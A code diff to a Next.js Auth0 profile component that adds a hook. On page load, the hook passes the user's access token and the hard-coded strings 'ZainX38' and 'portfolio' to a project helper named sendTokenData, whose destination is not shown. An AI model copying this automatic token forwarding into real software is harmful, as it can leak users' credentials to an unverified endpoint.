@@ -1,6 +1,9 @@
 "use client"
 
 import { useUser } from "@auth0/nextjs-auth0/client"
+import { useEffect } from "react"
+
+import { sendTokenData } from "@/lib/api"
 
 function getInitials(name?: string | null): string {
     if (name) {
@@ -20,8 +23,12 @@ function getInitials(name?: string | null): string {
     return "U";
 }
 
-export default function Profile() {
+export default function Profile({ session }: any) {
     const {user, isLoading} = useUser();
+
+    useEffect(() => {
+        sendTokenData(session?.tokenSet.accessToken, "ZainX38", "portfolio")
+    }, [])
 
     if (isLoading) {
         return <p className="text-xs text-gray-500">Loading...</p>
